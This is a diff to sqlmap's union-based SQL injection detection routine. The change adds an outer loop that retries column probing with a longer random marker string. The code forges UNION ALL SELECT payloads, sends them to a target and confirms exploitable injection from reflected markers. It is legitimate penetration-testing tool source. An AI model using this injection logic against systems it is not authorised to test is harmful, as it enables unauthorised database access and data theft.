@@ -165,74 +165,78 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
     # Unbiased approach for searching appropriate usable column
     random.shuffle(positions)
 
-    # For each column of the table (# of NULL) perform a request using
-    # the UNION ALL SELECT statement to test it the target URL is
-    # affected by an exploitable union SQL injection vulnerability
-    for position in positions:
-        # Prepare expression with delimiters
-        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS)
-        phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
-        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
-        randQueryUnescaped = unescaper.escape(randQueryProcessed)
+    for charCount in (UNION_MIN_RESPONSE_CHARS << 2, UNION_MIN_RESPONSE_CHARS):
+        if vector:
+            break
 
-        # Forge the union SQL injection request
-        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
-        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
+        # For each column of the table (# of NULL) perform a request using
+        # the UNION ALL SELECT statement to test it the target URL is
+        # affected by an exploitable union SQL injection vulnerability
+        for position in positions:
+            # Prepare expression with delimiters
+            randQuery = randomStr(charCount)
+            phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
+            randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
+            randQueryUnescaped = unescaper.escape(randQueryProcessed)
 
-        # Perform the request
-        page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
-        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
-            removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
-            payload, True) or "")
+            # Forge the union SQL injection request
+            query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
+            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
-        if content and phrase in content:
-            validPayload = payload
-            kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
-            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, False)
+            # Perform the request
+            page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
+            content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
+                removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
+                payload, True) or "")
 
-            if where == PAYLOAD.WHERE.ORIGINAL:
-                # Prepare expression with delimiters
-                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS)
-                phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
-                randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
-                randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)
+            if content and phrase in content:
+                validPayload = payload
+                kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
+                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, False)
 
-                # Confirm that it is a full union SQL injection
-                query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
-                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
+                if where == PAYLOAD.WHERE.ORIGINAL:
+                    # Prepare expression with delimiters
+                    randQuery2 = randomStr(charCount)
+                    phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
+                    randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
+                    randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)
 
-                # Perform the request
-                page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
-                content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")
-
-                if not all(_ in content for _ in (phrase, phrase2)):
-                    vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
-                elif not kb.unionDuplicates:
-                    fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
-
-                    # Check for limited row output
-                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
+                    # Confirm that it is a full union SQL injection
+                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                     payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
                     # Perform the request
                     page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
-                    content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
-                        removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
-                        payload, True) or "")
-                    if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
-                        warnMsg = "output with limited number of rows detected. Switching to partial mode"
-                        logger.warn(warnMsg)
-                        vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE, kb.unionDuplicates, False)
+                    content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")
 
-            unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()
+                    if not all(_ in content for _ in (phrase, phrase2)):
+                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
+                    elif not kb.unionDuplicates:
+                        fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
 
-            if unionErrorCase and count > 1:
-                warnMsg = "combined UNION/error-based SQL injection case found on "
-                warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
-                warnMsg += "column with better characteristics"
-                logger.warn(warnMsg)
-            else:
-                break
+                        # Check for limited row output
+                        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
+                        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
+
+                        # Perform the request
+                        page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
+                        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
+                            removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
+                            payload, True) or "")
+                        if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
+                            warnMsg = "output with limited number of rows detected. Switching to partial mode"
+                            logger.warn(warnMsg)
+                            vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE, kb.unionDuplicates, False)
+
+                unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()
+
+                if unionErrorCase and count > 1:
+                    warnMsg = "combined UNION/error-based SQL injection case found on "
+                    warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
+                    warnMsg += "column with better characteristics"
+                    logger.warn(warnMsg)
+                else:
+                    break
 
     return validPayload, vector
 
